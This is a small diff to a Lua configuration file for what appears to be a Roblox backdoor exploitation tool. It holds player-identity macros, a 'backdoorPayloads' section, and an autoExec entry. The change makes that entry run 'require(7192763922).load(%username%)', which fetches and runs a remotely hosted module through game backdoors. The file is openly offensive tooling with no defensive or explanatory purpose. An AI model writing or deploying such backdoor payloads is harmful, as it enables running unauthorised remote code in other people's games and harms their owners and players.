@@ -48,12 +48,11 @@ return {
 	["scriptMacros"] = {
 		["username"] = function() return game.Players.LocalPlayer.Name end,
         ["userid"]   = function() return game.Players.LocalPlayer.UserId end,
-        ["placeid"]  = function() return game.PlaceId end,
-		["someid"] = 7192763922
+        ["placeid"]  = function() return game.PlaceId end
 	},
 	["autoExec"] = {
 	[[warn("mico on top")]],
-	[[require(someid).load(%username%)]],
+	[[require(7192763922).load(%username%)]],
 	},
 	-- $backdoor payloads
 	["backdoorPayloads"] = {
